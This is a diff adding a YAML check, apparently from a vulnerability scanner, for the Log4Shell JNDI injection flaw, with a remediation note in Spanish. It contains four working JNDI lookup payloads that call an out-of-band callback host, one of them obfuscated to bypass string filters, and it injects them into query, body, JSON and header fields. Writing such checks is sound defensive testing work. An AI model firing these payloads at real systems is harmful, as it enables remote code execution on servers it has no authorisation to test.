@@ -1,0 +1,24 @@
+id: log4shell-jndi
+name: JNDI Injection / Log4Shell (blind, OAST-confirmed)
+family: rce
+severity: critical
+cwe: CWE-502
+owasp: WSTG-INPV-11
+# Logging frameworks commonly log request headers, so injecting there matters as
+# much as body/query — this is exactly how CVE-2021-44228 was triggered.
+inject_into: [query, body, json, header]
+payloads:
+  - "${jndi:ldap://{{oast_domain}}/{{oast_token}}}"
+  - "${jndi:rmi://{{oast_domain}}/{{oast_token}}}"
+  - "${jndi:dns://{{oast_domain}}/{{oast_token}}}"
+  # Obfuscated variant that bypasses naive string filters.
+  - "${${lower:j}ndi:${lower:l}dap://{{oast_domain}}/{{oast_token}}}"
+oracle:
+  type: any_of
+  checks:
+    - type: oob
+confirm_reproducible: false
+remediation: >-
+  Actualiza Log4j (>= 2.17.1) o el componente vulnerable. Deshabilita la
+  resolución de lookups JNDI, no registres datos controlados por el usuario sin
+  sanear, y bloquea el egress de red de la aplicación hacia destinos no confiables.
